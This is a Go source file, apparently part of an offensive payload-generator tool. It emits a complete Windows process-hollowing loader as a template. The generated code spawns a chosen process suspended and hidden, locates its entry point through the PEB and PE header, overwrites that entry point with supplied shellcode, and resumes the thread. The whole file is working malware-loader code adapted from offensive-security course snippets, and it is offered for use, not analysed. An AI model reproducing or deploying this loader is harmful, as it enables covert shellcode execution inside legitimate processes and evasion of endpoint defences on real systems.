package loaders

import (
	"fmt"
	"strings"
)

/*
   For more information, feel free to read this:
   https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf

   Adapted from
   https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs
*/

type ProcHollowTemplate struct{}

func (t ProcHollowTemplate) Import() string {
	return fmt.Sprintf(`
import (
	"encoding/binary"
	"syscall"
	"unsafe"
)
`)
}

func (t ProcHollowTemplate) Const() string {
	return fmt.Sprintf(`
const (
    CREATE_SUSPENDED          = 0x00000004
    CREATE_NO_WINDOW          = 0x08000000

    MEM_COMMIT                = 0x00001000
    MEM_RESERVE               = 0x00002000
    PAGE_EXECUTE_READWRITE    = 0x00000040
)

var (
	kernel32                = syscall.MustLoadDLL("kernel32.dll")
    readProcessMemory       = kernel32.MustFindProc("ReadProcessMemory")
	writeProcessMemory      = kernel32.MustFindProc("WriteProcessMemory")
	resumeThread            = kernel32.MustFindProc("ResumeThread")
    WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")

	ntdll                       = syscall.MustLoadDLL("ntdll.dll")
    zwQueryInformationProcess   = ntdll.MustFindProc("ZwQueryInformationProcess")
)


/* need to redefine this so that compile doesnt whine */
type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}
`)
}

func (t ProcHollowTemplate) Init() string {
	return ""
}

func (t ProcHollowTemplate) Process() string {
	return ""
}

func (t ProcHollowTemplate) GetTemplate(targetProcess string) string {
	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func createProcess(processName string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(processName); if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
    ); if err != nil {
		panic(err)
	}

	return &pi
}


func ExecuteOrderSixtySix(shellcode []byte) {
    processName := "__PROCESS__"
    process := createProcess(processName)
    pHandle := uintptr(process.Process)
    tHandle := uintptr(process.Thread)

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	unusedTmpValue := 0

    /* Get Process Environment Block */
    r, _, err := zwQueryInformationProcess.Call(
        pHandle,
        0,
        uintptr(unsafe.Pointer(basicInfo)),
        pointerSize * 6,
        uintptr(unsafe.Pointer(&unusedTmpValue)),
    ); if r != 0 {
        panic(err)
    }

    /* Query PEB for ImageBaseAddress */
	imageBaseAddress := basicInfo.PebAddress + 0x10

    // Get entry point of the actual process executable
    // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
    // From the PEB (address we got in last call), we have to do the following:
    // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
    // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
    // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
    // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address.


    // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
    procAddr := make([]byte, 0x8)
	read := 0

    r, _, err = readProcessMemory.Call(
        pHandle,
        imageBaseAddress,
        uintptr(unsafe.Pointer(&procAddr[0])),
        uintptr(len(procAddr)),
        uintptr(unsafe.Pointer(&read)),
    ); if r == 0 {
        panic(err)
    }

    // now we can read PE header
	exeBaseAddr := binary.LittleEndian.Uint64(procAddr)
    peBuffer := make([]byte, 0x200)
	r, _, err = readProcessMemory.Call(
        pHandle,
        uintptr(exeBaseAddr),
        uintptr(unsafe.Pointer(&peBuffer[0])),
        uintptr(len(peBuffer)),
        uintptr(unsafe.Pointer(&read)),
    ); if r == 0 {
        panic(err)
    }

    // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
	lfaNewPos := peBuffer[0x3c : 0x3c + 0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)

    // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
	rvaOffset := lfanew + 0x28

    // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
    rvaOffsetPos := peBuffer[rvaOffset : rvaOffset + 0x4]
    rva := binary.LittleEndian.Uint32(rvaOffsetPos)

    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address.
    entrypointAddress := exeBaseAddr + uint64(rva)


    /* overwrite process memory at entrypointAddress */
    r, _, err = writeProcessMemory.Call(
        pHandle,
        uintptr(entrypointAddress),
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        0,
    ); if r == 0 {
        panic(err)
    }

    /* trigger shellcode execution */
	r, _, err = resumeThread.Call(tHandle); if r == 0 {
        panic(err)
    }
}
    `
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
}
